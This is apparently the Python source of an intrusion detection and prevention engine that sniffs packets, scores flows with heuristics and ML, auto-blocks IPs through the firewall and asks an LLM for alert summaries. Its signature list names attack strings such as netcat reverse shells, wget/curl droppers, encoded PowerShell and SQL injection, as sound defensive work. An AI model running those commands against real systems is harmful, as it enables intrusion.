#!/usr/bin/env python3
"""
Real-Time IDS/IPS Engine - Complete Fixed Version
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Fixes applied:
  [1] Windows Firewall (netsh) instead of iptables
  [2] Multi-interface + promiscuous capture
  [3] Correct HF Inference API for Qwen2.5-72B chat
  [4] Heuristics fire BEFORE and INDEPENDENT of ML model
  [5] Self-traffic detection via raw socket monitor thread
  [6] Evidence-based confidence scores (ConfidenceCalculator)
      — no hardcoded numbers; every score computed from real signals
  [7] Port scan deduplication — one alert per 30s per attacker IP,
      not one alert per packet after threshold
"""

import os, sys, json, time, logging, threading, subprocess, platform, socket, struct, base64
from datetime import datetime
from collections import defaultdict, deque
from dataclasses import dataclass, field, asdict
from typing import Optional, Dict, List, Tuple
import requests

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(name)-14s  %(levelname)-8s  %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("ids_engine.log", encoding="utf-8"),
    ],
)
log = logging.getLogger("IDS")

# Avoid Windows console UnicodeEncodeError on cp1252 terminals
try:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

# ── Platform ─────────────────────────────────────────────────────────────────
IS_WINDOWS = platform.system() == "Windows"
IS_ADMIN   = False

if IS_WINDOWS:
    import ctypes
    IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
else:
    IS_ADMIN = os.geteuid() == 0

# ── Scapy import ─────────────────────────────────────────────────────────────
try:
    from scapy.all import (
        sniff, IP, TCP, UDP, ICMP, Raw,
        conf, get_if_list, Ether,
    )
    if IS_WINDOWS:
        conf.use_pcap = True          # force WinPcap / Npcap
    conf.verb = 0
    SCAPY_OK = True
except Exception as e:
    log.error(f"Scapy unavailable: {e}  →  pip install scapy")
    sys.exit(1)

# ── Optional ML ──────────────────────────────────────────────────────────────
try:
    import numpy as np, joblib
    from ids_ips_trainer import IDSPredictor
    ML_OK = True
except ImportError:
    ML_OK = False
    log.warning("numpy / joblib missing (or trainer not importable) – ML scoring disabled (heuristics still active)")

# ── Adaptive subsystems ──────────────────────────────────────────────────────
try:
    from drift_monitor import DriftMonitor
    DRIFT_OK = True
except ImportError:
    DRIFT_OK = False

try:
    from explainability import create_explainer
    SHAP_OK = True
except ImportError:
    SHAP_OK = False

try:
    from feedback_loop import FeedbackCollector, AdaptiveScheduler
    FEEDBACK_OK = True
except ImportError:
    FEEDBACK_OK = False

try:
    from adaptive_policy import AdaptivePolicy
    POLICY_OK = True
except ImportError:
    POLICY_OK = False

try:
    from secure_sniffer import SecureSniffer, DecryptedFlowIngester
    SNIFFER_OK = True
except ImportError:
    SNIFFER_OK = False

try:
    from llm_analyzer import LLMAnalyzer as StandaloneLLM
    STANDALONE_LLM_OK = True
except ImportError:
    STANDALONE_LLM_OK = False

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
def _find_hf_api_key() -> str:
    """
    Load HF API key from, in order:
      1. HF_API_KEY environment variable
      2. Any .txt file in the project directory containing a line starting with hf_
    """
    key = os.environ.get("HF_API_KEY", "").strip()
    if key.startswith("hf_"):
        log.info(f"HF API key loaded from environment ({key[:12]}...)")
        return key
    for directory in [os.getcwd(), os.path.dirname(os.path.abspath(__file__))]:
        try:
            for fname in os.listdir(directory):
                fpath = os.path.join(directory, fname)
                if not os.path.isfile(fpath):
                    continue
                if not (fname.endswith(".txt") or fname in ("hf_token", ".env", "hf_api_key")):
                    continue
                try:
                    for line in open(fpath, encoding="utf-8", errors="ignore"):
                        line = line.strip()
                        if line.startswith("hf_") and len(line) > 20:
                            log.info(f"HF API key loaded from {fname} ({line[:12]}...)")
                            return line
                        for sep in ("=", ":"):
                            if sep in line:
                                val = line.split(sep, 1)[1].strip().strip('"').strip("'")
                                if val.startswith("hf_") and len(val) > 20:
                                    log.info(f"HF API key loaded from {fname} ({val[:12]}...)")
                                    return val
                except Exception:
                    pass
        except Exception:
            pass
    log.warning("HF API key not found — LLM disabled")
    log.warning("  Fix: $env:HF_API_KEY='hf_xxx'  OR save token to any .txt file in project folder")
    return ""


CFG = {
    "alert_log"      : "ids_alerts.jsonl",
    "model_path"     : "ids_output",
    "hf_api_key"     : _find_hf_api_key(),
    "hf_model"       : "Qwen/Qwen2.5-72B-Instruct",
    "blocking"       : True,
    "stats_interval" : 30,        # seconds between [STATS] lines
    "flow_timeout"   : 120,       # seconds before idle flow expires
    "llm_enabled"    : True,
    "llm_threshold"  : 0.6,       # ML confidence before calling LLM
    "scan_threshold" : 15,        # unique ports in 10 s  → port scan
    "syn_flood_rate" : 100,       # SYN pkts/s per src   → flood
    # Adaptive suppression: how many identical analyst FP marks required
    # before we suppress future alerts for the same (proto,dst_port,label) pattern.
    "fp_suppress_min_count": 3,
    # Per-class confidence thresholds (supervised ML alerts).
    # Use HIGHER thresholds for noisy classes to reduce false positives.
    "class_thresholds": {
        "EXPLOIT": 0.80,
        "DOS": 0.75,
        "PROBE": 0.72,
        "SCAN": 0.72,
        "NMAP": 0.72,
        # fallback for everything else
        "*": 0.70,
    },
    # Uncertainty gating: if top1-top2 probability margin is small, the model is unsure.
    # We downgrade the alert to LOW/LOG (no blocking) to reduce false positives.
    "min_proba_margin": 0.12,
}

# ── Attack signatures (bytes in payload) ─────────────────────────────────────
#
# Format:  sig_bytes → (attack_name, web_safe)
#
# web_safe=True  → SKIP this sig when packet is a normal HTTP/S server response
#                  (src_port in WEB_SERVER_PORTS).  <script> is in every webpage;
#                  it only matters when sent in a REQUEST or on a non-web port.
# web_safe=False → Always fire regardless of port context (nc -e has no safe use).
#
PAYLOAD_SIGS: Dict[bytes, tuple] = {
    b"\x90" * 8     : ("NOP-Sled / Shellcode",        False),
    b"/etc/passwd"  : ("Path Traversal",               False),
    b"UNION SELECT" : ("SQL Injection",                True ),
    b"<script"      : ("XSS Attempt",                  True ),
    b"onerror="     : ("XSS Event Handler",            True ),
    b"javascript:"  : ("JavaScript Injection",         True ),
    # Obfuscated / alternative web attack forms (wider net for "wired" simulator)
    b"<svg"         : ("XSS Attempt (SVG)",            True ),
    b"onload="      : ("XSS Event Handler (onload)",   True ),
    b"ontoggle="    : ("XSS Event Handler (ontoggle)", True ),
    b"onpageshow="  : ("XSS Event Handler (onpageshow)", True ),
    b"onmouseover=" : ("XSS Event Handler (mouseover)", True ),
    b"sleep("       : ("SQL Injection (time-based)",   True ),
    b"' or '1'='1"  : ("SQL Injection (tautology)",    True ),
    b"cmd.exe"      : ("Windows CMD Injection",        False),
    b"powershell -e": ("Encoded PowerShell",           False),
    b"/bin/bash"    : ("Shell Injection",              False),
    b"wget http"    : ("Malware Dropper (wget)",       False),
    b"curl http"    : ("Malware Dropper (curl)",       False),
    b"nc -e"        : ("Netcat Reverse Shell",         False),
    b"python -c"    : ("Python Exec Injection",        False),
    b"base64 -d"    : ("Base64 Decode Chain",          False),
    b"../../"       : ("Directory Traversal",          True ),
    # --- Advanced Wired/Obfuscated signatures ---
    b"REGEX:UNI[\\s/\\*\\+]+ON[\\s/\\*\\+]+SEL[\\s/\\*\\+]+ECT" : ("Obfuscated SQLi", False),
    b"REGEX:SEL[\\s/\\*\\+]+ECT[\\s/\\*\\+]+.*FROM" : ("Obfuscated SQLi (From)", False),
    b"REGEX:<[\\s/]*script" : ("XSS Attempt (Obfuscated)", True),
    b"REGEX:src[\\s/]*=[\\s/]*['\"]?javascript:" : ("JS Injection (Obfuscated)", True),
    b"REGEX:c[\\^]m[\\^]d" : ("Obfuscated CMD Injection", False),
    b"REGEX:p[\\^]o[\\^]w[\\^]e[\\^]r" : ("Obfuscated PowerShell", False),
    b"REGEX:\\.\\.[/%\\\\].*\\.\\.[/%\\\\]" : ("Obfuscated Traversal", True),
    b"REGEX:/etc/.*passwd" : ("Path Traversal (Linux)", False),
    b"REGEX:boot\\.ini" : ("Path Traversal (Windows)", False),
    b"REGEX:windows/system32" : ("Path Traversal (Windows)", False),
}

# Common web/service ports to help differentiate normal traffic from attacks
# Common web/service ports to help differentiate normal traffic from attacks
WEB_SERVER_PORTS = {
    80, 443, 8080, 8443, 5000, 3000, 8000, 8501, 9090, 9000, 
    8050, 8051, 3001, 3002, 5001, 5002, 1337, 8888, 6006, 4000,
    5355, 137, 138  # LLMNR, NetBIOS (Safe Windows noise)
}

# Ports that ALWAYS carry high-entropy data (encryption / compression).
# Entropy-based anomaly checks MUST be skipped on these ports — flagging
# TLS handshake data as "suspicious entropy" is a guaranteed false positive.
#
#   443 / 8443  — HTTPS / TLS
#   993 / 995   — IMAPS / POP3S
#   465 / 587   — SMTPS
#   22          — SSH (encrypted session data)
#   500 / 4500  — IKE / IPSec (VPN key exchange)
#   51820       — WireGuard VPN
#   1194        — OpenVPN
ENCRYPTED_PORTS = {
    443, 8443,          # HTTPS
    993, 995,           # IMAPS, POP3S
    465, 587,           # SMTPS
    22,                 # SSH
    500, 4500,          # IKE / IPSec
    51820,              # WireGuard
    1194,               # OpenVPN
}

# ── Suspicious / high-risk ports ─────────────────────────────────────────────
SUSPICIOUS_PORTS: Dict[int, str] = {
    4444 : "Metasploit default listener",
    5555 : "ADB / Metasploit alt",
    1337 : "Elite / hacker port",
    31337: "Back Orifice RAT",
    6667 : "IRC / botnet C2",
    6668 : "IRC alt",
    6669 : "IRC alt",
    9001 : "Tor entry node",
    9050 : "Tor SOCKS proxy",
    4899 : "Radmin RAT",
    1080 : "SOCKS proxy",
    8888 : "Jupyter (exposed)",
    3333 : "Mining pool",
    14444: "Mining pool alt",
    65535: "Reserved – likely scan probe",
}

HIGH_RISK_PORTS: Dict[int, str] = {
    445  : "SMB (EternalBlue target)",
    135  : "RPC (BlueKeep target)",
    139  : "NetBIOS",
    3389 : "RDP brute-force",
    23   : "Telnet (cleartext)",
    21   : "FTP (cleartext)",
    69   : "TFTP (malware delivery)",
    161  : "SNMP (info leak)",
    389  : "LDAP (injection)",
    636  : "LDAPS",
}
 
# Major service providers to help suppress ML false positives on encrypted traffic
TRUSTED_IP_PREFIXES = {
    "142.", "172.217.", "34.", "35.",    # Google / GCP
    "104.", "172.64.", "172.67.",        # Cloudflare
    "149.154.", "91.108.",               # Telegram
    "102.132.",                          # Meta/WhatsApp
    "150.171.", "52.", "20.", "13.",     # Microsoft/Azure
    "23.", "184.", "2.22.", "2.16.",     # Akamai / Edge
    "185.", "192.178.", "66.",           # Netflix / Misc CDNs
    "18.", "3.", "44.", "54.",           # AWS (Amazon)
    "17.", "192.35.", "139.178.",        # Apple / Apple Music
}

# ══════════════════════════════════════════════════════════════════════════════
#  DATA STRUCTURES
# ══════════════════════════════════════════════════════════════════════════════
@dataclass
class FlowKey:
    src_ip  : str
    dst_ip  : str
    src_port: int
    dst_port: int
    proto   : str

    def __hash__(self):
        return hash((self.src_ip, self.dst_ip, self.src_port, self.dst_port, self.proto))

    def __eq__(self, other):
        return asdict(self) == asdict(other)


@dataclass
class Flow:
    key         : FlowKey
    start_time  : float  = field(default_factory=time.time)
    last_seen   : float  = field(default_factory=time.time)
    pkt_count   : int    = 0
    byte_count  : int    = 0
    syn_count   : int    = 0
    fin_count   : int    = 0
    rst_count   : int    = 0
    ack_count   : int    = 0
    flags_seen  : set    = field(default_factory=set)
    payloads    : list   = field(default_factory=list)   # last 5 payloads
    last_entropy: float  = 0.0
    alerted     : bool   = False

    def duration(self) -> float:
        return self.last_seen - self.start_time

    def pps(self) -> float:
        d = self.duration()
        return self.pkt_count / d if d > 0 else self.pkt_count


@dataclass
class Alert:
    timestamp   : str
    src_ip      : str
    dst_ip      : str
    src_port    : int
    dst_port    : int
    proto       : str
    severity    : str           # CRITICAL / HIGH / MEDIUM / LOW
    attack_type : str
    rule        : str
    confidence  : float
    # Real-time feature snapshot (used by feedback loop / retraining)
    bidirectional_duration_ms: float = 0.0
    payload_entropy: float = 0.0
    payload_len_var: float = 0.0
    # ML uncertainty signal (top1-top2 prob margin); 0.0 if unavailable
    proba_margin: float = 0.0
    # Payload preview (for analyst review). Keep short + safe for UI.
    payload_sample_b64: str = ""
    payload_sample_text: str = ""
    llm_summary : str = ""
    blocked     : bool = False
    pkt_count   : int = 0
    byte_count  : int = 0
    mitre_tactic    : str = ""
    mitre_technique : str = ""
    shap_explanation: str = ""
    response_tier   : str = ""   # LOG / RATE_LIMIT / ISOLATE / BLOCK
    heuristic_confidence: float = 0.0
    ml_confidence: float = 0.0
    genai_confidence: float = 0.0


# ══════════════════════════════════════════════════════════════════════════════
#  FIREWALL MANAGER  (Windows netsh  OR  Linux iptables)
# ══════════════════════════════════════════════════════════════════════════════
class FirewallManager:
    def __init__(self):
        self.blocked_ips : set = set()
        self._lock = threading.Lock()
        if not IS_ADMIN:
            log.warning("Not running as admin/root - BLOCKING DISABLED")

    # IPs that must NEVER be blocked regardless of what the heuristics say.
    # Blocking your own machine or the gateway cuts off all network access.
    WHITELIST_PREFIXES = (
        "127.",           # loopback
        "0.0.0.0",        # unspecified
        "::1",            # IPv6 loopback
        "255.255.255.255",# broadcast
    )

    def _is_whitelisted(self, ip: str) -> bool:
        """Return True if this IP must never be blocked."""
        if any(ip.startswith(p) for p in self.WHITELIST_PREFIXES):
            return True
        # Never block our own LAN IPs
        try:
            import socket as _s
            own_ips = set()
            for info in _s.getaddrinfo(_s.gethostname(), None):
                own_ips.add(info[4][0])
            own_ips.add(_s.gethostbyname(_s.gethostname()))
            if ip in own_ips:
                log.warning(f"BLOCK SUPPRESSED: {ip} is our own IP — never blocking self")
                return True
        except Exception:
            pass
        return False

    def block(self, ip: str, reason: str) -> bool:
        if not IS_ADMIN or not CFG["blocking"]:
            return False
        if self._is_whitelisted(ip):
            log.warning(f"BLOCK SUPPRESSED (whitelisted): {ip}  reason={reason}")
            return False
        with self._lock:
            if ip in self.blocked_ips:
                return False
            ok = self._add_rule(ip, reason)
            if ok:
                self.blocked_ips.add(ip)
                log.warning(f"🚫 BLOCKED  {ip:<18}  reason={reason}")
            return ok

    def unblock_all(self):
        with self._lock:
            for ip in list(self.blocked_ips):
                self._remove_rule(ip)
            self.blocked_ips.clear()
        log.info("All firewall rules removed.")

    def unblock(self, ip: str) -> bool:
        """Unblock a single IP (manual release)."""
        if not IS_ADMIN or not CFG["blocking"]:
            return False
        with self._lock:
            if ip not in self.blocked_ips:
                return False
            self._remove_rule(ip)
            try:
                self.blocked_ips.remove(ip)
            except KeyError:
                pass
        log.warning(f"UNBLOCKED  {ip}")
        return True

    # ── Windows ──────────────────────────────────────────────────────────────
    def _add_rule(self, ip: str, reason: str) -> bool:
        name = f"IDS_BLOCK_{ip.replace('.','_')}"
        if IS_WINDOWS:
            cmds = [
                # Block inbound
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 f"name={name}_IN", "dir=in", "action=block",
                 f"remoteip={ip}", "enable=yes",
                 f"description=IDS auto-block: {reason}"],
                # Block outbound
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 f"name={name}_OUT", "dir=out", "action=block",
                 f"remoteip={ip}", "enable=yes",
                 f"description=IDS auto-block: {reason}"],
            ]
        else:
            cmds = [
                ["iptables", "-I", "INPUT",  "1", "-s", ip, "-j", "DROP"],
                ["iptables", "-I", "OUTPUT", "1", "-d", ip, "-j", "DROP"],
            ]
        for cmd in cmds:
            try:
                r = subprocess.run(cmd, capture_output=True, timeout=5)
                if r.returncode != 0:
                    log.error(f"Firewall cmd failed: {' '.join(cmd)}\n{r.stderr.decode()}")
                    return False
            except Exception as e:
                log.error(f"Firewall exception: {e}")
                return False
        return True

    def _remove_rule(self, ip: str):
        name = f"IDS_BLOCK_{ip.replace('.','_')}"
        if IS_WINDOWS:
            for suffix in ("_IN", "_OUT"):
                subprocess.run(
                    ["netsh", "advfirewall", "firewall", "delete",
                     "rule", f"name={name}{suffix}"],
                    capture_output=True, timeout=5
                )
        else:
            for direction, flag in [("INPUT", "-s"), ("OUTPUT", "-d")]:
                subprocess.run(
                    ["iptables", "-D", direction, flag, ip, "-j", "DROP"],
                    capture_output=True, timeout=5
                )


# ══════════════════════════════════════════════════════════════════════════════
#  LLM ANALYZER  (Qwen2.5-72B via HuggingFace Inference API)
# ══════════════════════════════════════════════════════════════════════════════
class LLMAnalyzer:
    """
    Multi-provider LLM analyzer with automatic fallback chain.

    Provider priority (all free, no credit card):
      1. Groq     — fastest, free tier, Llama-3.3-70B quality
                    Get key: https://console.groq.com  (30 seconds)
      2. HF Router — huggingface.co new inference router (2025 URL)
      3. Disabled  — IDS still works fully; heuristics don't need LLM

    The LLM does NOT affect detection — heuristics detect everything.
    LLM adds human-readable context to each alert.

    Environment variables (set any one):
      $env:GROQ_API_KEY  = "gsk_..."
      $env:HF_API_KEY    = "hf_..."
    Or put either token in a .txt file in the project folder.
    """

    # Default is Llama 3.3 via Groq; Ollama (local) can be added by setting
    # OLLAMA_BASE_URL and using model name "llama3.3" if installed locally.
    PROVIDERS = [
        {
            "name"   : "Groq",
            "url"    : "https://api.groq.com/openai/v1/chat/completions",
            "key_env": "GROQ_API_KEY",
            "key_prefix": "gsk_",
            "models" : [
                "llama-3.3-70b-versatile",   # best quality, free
                "llama3-8b-8192",            # faster fallback
                "mixtral-8x7b-32768",        # good security reasoning
            ],
        },
        {
            "name"   : "HuggingFace",
            "url"    : "https://router.huggingface.co/v1/chat/completions",
            "key_env": "HF_API_KEY",
            "key_prefix": "hf_",
            "models" : [
                "HuggingFaceH4/zephyr-7b-beta",
                "mistralai/Mistral-7B-Instruct-v0.3",
            ],
        },
    ]

    def __init__(self):
        self.enabled      = CFG["llm_enabled"]
        self._active_url  = ""
        self._active_model= ""
        self._active_key  = ""
        self._model_ok    = False
        self._call_count  = 0
        self._state_lock  = threading.Lock()
        self._probe_done  = threading.Event()
        if self.enabled:
            threading.Thread(target=self._probe_all_providers, daemon=True, name="LLMProbe").start()
        else:
            log.warning("LLMAnalyzer  DISABLED via config")
            self._probe_done.set()

    # ── key loading ───────────────────────────────────────────────────────────
    @staticmethod
    def _load_key(env_var: str, prefix: str) -> str:
        """Check env var, then scan .txt files for a token with given prefix."""
        key = os.environ.get(env_var, "").strip()
        if key.startswith(prefix) and len(key) > 20:
            return key
        # also accept HF_API_KEY when looking for Groq and vice versa (user typos)
        for var in (env_var, "GROQ_API_KEY", "HF_API_KEY", "LLM_API_KEY"):
            key = os.environ.get(var, "").strip()
            if key.startswith(prefix) and len(key) > 20:
                return key
        # scan files
        for directory in [os.getcwd(), os.path.dirname(os.path.abspath(__file__))]:
            try:
                for fname in os.listdir(directory):
                    if not fname.endswith((".txt", ".env", "")) or os.path.isdir(
                            os.path.join(directory, fname)):
                        continue
                    try:
                        for line in open(os.path.join(directory, fname),
                                         encoding="utf-8", errors="ignore"):
                            line = line.strip()
                            if line.startswith(prefix) and len(line) > 20:
                                return line
                            for sep in ("=", ":"):
                                if sep in line:
                                    val = line.split(sep, 1)[1].strip().strip("\"\'")
                                    if val.startswith(prefix) and len(val) > 20:
                                        return val
                    except Exception:
                        pass
            except Exception:
                pass
        return ""

    # ── startup probe ─────────────────────────────────────────────────────────
    @property
    def model(self) -> str:
        """Public alias — returns active model name or placeholder."""
        return self._active_model or self.PROVIDERS[0]['models'][0]

    def _probe_all_providers(self):
        """
        Walk through every provider + model combination.
        Stop at first successful HTTP 200.
        Runs in a background thread at startup.
        """
        try:
            for provider in self.PROVIDERS:
                key = self._load_key(provider["key_env"], provider["key_prefix"])
                if not key:
                    log.info(f"LLMAnalyzer  {provider['name']}: no key found - skipping")
                    continue
                headers = {"Authorization": f"Bearer {key}",
                           "Content-Type" : "application/json"}
                for model in provider["models"]:
                    body = {"model"      : model,
                            "messages"   : [{"role": "user",
                                             "content": "Reply with one word: READY"}],
                            "max_tokens" : 5,
                            "temperature": 0.0}
                    try:
                        r = requests.post(provider["url"], headers=headers,
                                          json=body, timeout=20)
                        if r.status_code == 200:
                            with self._state_lock:
                                self._active_url   = provider["url"]
                                self._active_model = model
                                self._active_key   = key
                                self._model_ok     = True
                            log.info(f"LLMAnalyzer  provider={provider['name']}  "
                                     f"model={model}  OK")
                            return
                        log.info(f"LLMAnalyzer  {provider['name']}/{model}  "
                                 f"HTTP {r.status_code} - skip")
                    except Exception as e:
                        log.info(f"LLMAnalyzer  {provider['name']}/{model}  {e} - skip")

            # Nothing worked
            log.warning("LLMAnalyzer  ALL providers failed - LLM offline")
            log.warning("  Best free option: https://console.groq.com (free signup)")
            log.warning("  Then: $env:GROQ_API_KEY='gsk_...' OR save to groq_key.txt")
            log.warning("  IDS detection is NOT affected - heuristics run independently")
            with self._state_lock:
                self.enabled = False
                self._model_ok = False
        finally:
            self._probe_done.set()

    # ── analysis ─────────────────────────────────────────────────────────────
    def analyze(self, flow: Flow, attack_type: str, rule: str) -> str:
        # Avoid false negatives during startup probing / brief races.
        if self.enabled:
            self._probe_done.wait(timeout=25)

        with self._state_lock:
            enabled = self.enabled
            ok = self._model_ok

        if not enabled or not ok:
            return "[LLM offline - set GROQ_API_KEY or HF_API_KEY (see logs)]"

        k = flow.key
        payload_hint = ""
        if flow.payloads:
            try:
                payload_hint = flow.payloads[-1][:80].decode("utf-8", errors="replace")
            except Exception:
                payload_hint = repr(flow.payloads[-1][:40])

        prompt = (
            "You are a senior network security analyst. You have just intercepted a highly suspicious network flow.\n"
            "Analyze the following technical indicators and provide a brief, professional summary.\n"
            "Vary your sentence structure and focus on the most unique aspects of this specific flow.\n\n"
            "Write exactly 2 sentences:\n"
            "1. A sharp threat assessment including confidence level (low/medium/high) and the logical reasoning behind it.\n"
            "2. A specific, actionable recommendation for a network administrator.\n\n"
            f"ALERT TYPE : {attack_type}\n"
            f"RULE       : {rule}\n"
            f"SOURCE     : {k.src_ip}:{k.src_port}\n"
            f"DESTINATION: {k.dst_ip}:{k.dst_port} [{k.proto}]\n"
            f"FLOW STATS : {flow.pkt_count} packets, {flow.byte_count} bytes, {flow.duration():.1f}s duration\n"
            f"INDICATORS : {flow.syn_count} SYNs, {flow.last_entropy:.2f} entropy\n"
            f"PAYLOAD    : {payload_hint or 'no payload observed'}\n"
        )

        headers = {"Authorization": f"Bearer {self._active_key}",
                   "Content-Type" : "application/json"}
        body    = {"model"      : self._active_model,
                   "messages"   : [{"role": "user", "content": prompt}],
                   "max_tokens" : 160,
                   "temperature": 0.2}
        try:
            r = requests.post(self._active_url, headers=headers,
                              json=body, timeout=25)
            if r.status_code == 200:
                self._call_count += 1
                content = r.json()["choices"][0]["message"]["content"].strip()
                # Sanitize: remove non-printable characters that cause '☻' symbols
                return "".join(c for c in content if c.isprintable() or c in "\n\r\t")
            elif r.status_code in (401, 403):
                log.error(f"LLM: token rejected ({r.status_code}) — "
                          "get new key at console.groq.com")
                self.enabled = False
                return "[LLM: token rejected]"
            elif r.status_code == 429:
                return "[LLM: rate limit hit - alert logged without LLM summary]"
            else:
                return f"[LLM HTTP {r.status_code}]"
        except requests.Timeout:
            return "[LLM: timeout]"
        except Exception as e:
            return f"[LLM error: {e}]"


# ══════════════════════════════════════════════════════════════════════════════
#  ML ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class MLEngine:
    def __init__(self, model_path: str):
        self.model_path = model_path
        self.predictor  = None
        self.available  = False
        self.model_mtime = 0.0
        if not ML_OK:
            return
        try:
            # Use the SAME artifacts produced by ids_ips_trainer.py
            #   ids_output/ids_model.pkl, ids_scaler.pkl, ids_metadata.pkl
            self.predictor = IDSPredictor(model_path)
            self.available = True
            self.model_mtime = self._get_model_mtime()
            log.info(f"ML predictor loaded from  {model_path} (mtime: {self.model_mtime})")
        except FileNotFoundError:
            log.warning(f"ML model not found at '{model_path}' – heuristics-only mode")
        except Exception as e:
            log.warning(f"ML model load error: {e}")

    def _get_model_mtime(self) -> float:
        try:
            return os.path.getmtime(os.path.join(self.model_path, "ids_model.pkl"))
        except Exception:
            return 0.0

    def reload(self):
        if not ML_OK:
            return
        try:
            self.predictor = IDSPredictor(self.model_path)
            self.available = True
            self.model_mtime = self._get_model_mtime()
            log.info(f"ML predictor RELOADED from {self.model_path} (mtime: {self.model_mtime})")
        except Exception as e:
            log.error(f"ML predictor reload error: {e}")

    def check_for_model_updates(self):
        if not ML_OK or not self.available:
            return
        current_mtime = self._get_model_mtime()
        if current_mtime > self.model_mtime:
            log.info(f"Detected updated ML model file (mtime: {current_mtime}). Reloading...")
            self.reload()


    @staticmethod
    def _calculate_entropy(payloads: list) -> float:
        """Calculate Shannon entropy of the combined payloads."""
        if not payloads:
            return 0.0
        # Combine last 5 payloads
        data = b"".join(payloads)
        if not data:
            return 0.0
        import math
        from collections import Counter
        counts = Counter(data)
        probs = [count / len(data) for count in counts.values()]
        ent = -sum(p * math.log2(p) for p in probs)
        return ent

    @staticmethod
    def _calculate_payload_var(payloads: list) -> float:
        """Calculate variance of payload lengths."""
        if len(payloads) < 2:
            return 0.0
        import numpy as np
        lens = [len(p) for p in payloads]
        return float(np.var(lens))

    @staticmethod
    def _top2_margin(probs: dict) -> float:
        """Return top1-top2 probability margin, or 0.0 if unavailable."""
        try:
            vals = sorted([float(v) for v in probs.values()], reverse=True)
            if len(vals) >= 2:
                return float(vals[0] - vals[1])
            return float(vals[0]) if vals else 0.0
        except Exception:
            return 0.0

    def predict(self, flow: Flow) -> Tuple[str, float, dict, float]:
        """Returns (label, confidence, probs, margin). Falls back safely if unavailable."""
        if not self.available:
            return "UNKNOWN", 0.0, {}, 0.0
        try:
            k = flow.key
            proto_num = 6 if k.proto == "TCP" else 17 if k.proto == "UDP" else 1 if k.proto == "ICMP" else 0
            
            # Calculate real-time payload features
            entropy = self._calculate_entropy(flow.payloads)
            flow.last_entropy = entropy
            p_var   = self._calculate_payload_var(flow.payloads)

            flow_dict = {
                "src_ip": k.src_ip,
                "dst_ip": k.dst_ip,
                "src_port": int(k.src_port),
                "dst_port": int(k.dst_port),
                "protocol": int(proto_num),
                "bidirectional_packets": int(flow.pkt_count),
                "bidirectional_bytes": int(flow.byte_count),
                "bidirectional_duration_ms": float(max(flow.duration(), 0.0) * 1000.0),
                "payload_entropy": float(entropy),
                "payload_len_var": float(p_var),
                "is_high_volume": int(flow.byte_count > 1_000_000),
            }
            res = self.predictor.predict_flow(flow_dict)
            label = str(res.get("label", "UNKNOWN"))
            conf = float(res.get("confidence", 0.0))
            probs = res.get("all_probs") or {}
            margin = self._top2_margin(probs) if isinstance(probs, dict) else 0.0
            # Normalize unsupervised output into a consistent label surface
            if label.upper() in {"ATTACK", "ANOMALY", "MALICIOUS"} and res.get("is_attack") is True:
                return "ATTACK", max(conf, 0.5), probs, margin
            return label, conf, probs, margin
        except Exception as e:
            log.debug(f"ML predict error: {e}")
            return "UNKNOWN", 0.0, {}, 0.0


# ══════════════════════════════════════════════════════════════════════════════
#  CONFIDENCE CALCULATOR
#  All scores are computed from real measured evidence — nothing is hardcoded.
#
#  Formula philosophy:
#    base_score  = probability this pattern is malicious at minimum evidence
#    evidence    = list of (weight, bool) tuples — each true factor adds weight
#    confidence  = base + sum(w for w,v in evidence if v), capped at 0.99
#
#  This means the more corroborating signals present, the higher the score.
#  A lone SYN to port 4444 with no payload scores lower than a SYN+payload
#  on port 4444 with high packet rate — because that IS more suspicious.
# ══════════════════════════════════════════════════════════════════════════════
class ConfidenceCalculator:

    @staticmethod
    def payload_sig(sig: bytes, name: str, flow: Flow, port_suspicious: bool) -> float:
        """
        Payload signature match.
        Base: 0.92 — exact byte match is strong evidence by itself.
        Boosters:
          +0.04  destination port is in SUSPICIOUS_PORTS (double context)
          +0.02  flow has seen multiple packets (not a one-shot probe)
          +0.01  flow carries a high byte rate (active session, not stray pkt)
        """
        base = 0.92
        evidence = [
            (0.04, port_suspicious),
            (0.02, flow.pkt_count > 1),
            (0.01, flow.pps() > 2),
        ]
        return min(0.99, base + sum(w for w, v in evidence if v))

    @staticmethod
    def suspicious_port(port: int, flow: Flow, has_payload: bool) -> float:
        """
        Traffic on a known-malicious port.
        Base: 0.78 — the port alone is suspicious but not proof.
        Boosters:
          +0.08  payload present in this packet (not just a probe SYN)
          +0.05  port is in the highest-risk tier (4444, 31337, 1337, 6667)
          +0.04  flow has 3+ packets (ongoing session, not a stray SYN)
          +0.03  flow has 10+ packets (fully established malicious session)
          +0.02  SYN count matches pkt count (pure SYN — possible scanner)
        """
        HIGH_TIER = {4444, 31337, 1337, 6667, 9001, 4899}
        base = 0.78
        evidence = [
            (0.08, has_payload),
            (0.05, port in HIGH_TIER),
            (0.04, flow.pkt_count >= 3),
            (0.03, flow.pkt_count >= 10),
            (0.02, flow.syn_count > 0 and flow.syn_count == flow.pkt_count),
        ]
        return min(0.99, base + sum(w for w, v in evidence if v))

    @staticmethod
    def syn_flood(rate_per_sec: float, threshold: int) -> float:
        """
        SYN flood — confidence is proportional to how far rate exceeds threshold.
        At threshold (100/s):   0.85
        At 2× threshold (200/s): ~0.92
        At 5× threshold (500/s): ~0.98
        Formula: base + rate_ratio_bonus, capped at 0.99
        """
        base        = 0.85
        rate_ratio  = rate_per_sec / threshold          # 1.0 at threshold
        rate_bonus  = min(0.14, (rate_ratio - 1.0) * 0.09)
        return min(0.99, base + rate_bonus)

    @staticmethod
    def port_scan(unique_port_count: int, threshold: int,
                  elapsed_secs: float, dst_count: int) -> float:
        """
        Port scan — confidence grows with port count, speed, and spread.
        At threshold (15 ports):           ~0.85
        At 25 ports in 10s:                ~0.93
        At 25 ports in 3s (fast scan):     ~0.96
        At 25 ports across 5 hosts:        +0.03 extra

        Formula components:
          base         = 0.82
